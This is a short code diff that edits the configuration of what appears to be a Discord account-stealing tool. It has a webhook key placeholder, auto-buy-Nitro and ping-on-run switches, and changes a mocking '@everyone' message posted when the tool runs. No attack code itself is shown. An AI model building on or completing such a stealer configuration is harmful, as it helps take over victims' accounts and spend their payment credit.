@@ -10,7 +10,7 @@ const config = {
   webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
   ping_on_run: true, 
-  ping_val: '@everyone at least bro tried.', 
+  ping_val: '@everyone bro thought he could do something lmao.', 
   embed_name: 'Unthinkable Services', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1105305616504868954/1105323712623956079/image_2023-05-08_224130275.png', 
   embed_color: 0, 
